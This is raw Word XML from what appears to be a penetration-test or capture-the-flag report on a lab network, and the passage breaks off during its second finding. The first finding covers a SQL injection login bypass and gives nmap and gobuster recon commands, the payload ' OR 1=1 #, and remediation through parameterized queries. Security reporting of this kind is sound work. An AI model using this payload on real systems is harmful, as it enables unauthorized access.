        <w:spacing w:line="369" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="6140"/>
        <w:jc w:val="both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Date of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g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age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m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t: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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:tab/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t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g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ine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r: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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:w w:val="33"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single" w:color="404040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m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t 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p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e: 1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72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.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31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.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1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.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0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/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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2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4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="1080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J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u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mp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box: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172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.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31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.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1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.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1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0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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Dev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p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ort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l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(w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eb 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rver):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172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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3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1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.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1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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1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1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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XRAY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(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X-Ray Ma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hine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)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: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172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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3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1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.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1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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1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2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId42"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1520" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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Dean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-PC (Manager Sta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io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)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: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172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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3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1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.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1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.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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1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4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="30"/>
        <w:ind w:left="1039" w:right="7178"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1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.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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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I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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a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 xml:space="preserve">l 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Ac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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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e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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s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s v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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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SQL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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> In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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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tion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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g 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ent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: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FL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3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>G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{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n_p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el_sql_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y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ss}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: Hi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g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| C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VS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e: 9.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1352"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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uc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ully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b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y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login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orm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sing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c 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QL i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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jecti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 p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y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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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his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v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la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k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of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ut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v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li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ion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exp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he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y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em to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ut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oriz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cc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ss.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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nu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l 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njecti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 v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br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w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ser input</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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nm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&lt;ta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ge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_I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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="18"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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go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er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ir -u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p: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/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/&lt;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ge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_I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&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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QLi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y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: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'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OR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1=1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#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Implem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nt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mete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iz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q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ueries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input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v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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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 p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em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nts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 elimi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e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ct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QL e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x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ec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ion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of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er input.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2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.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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Se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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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si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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>D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ata</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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s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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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ove</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r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 xml:space="preserve">y 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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n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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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 xml:space="preserve">User </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>H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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>m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e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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>D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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ry</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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 xml:space="preserve">g </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ie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: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FL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G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{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_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nking</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_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etai</w:t>
      </w:r>
      <w:r>
        <w:rPr>
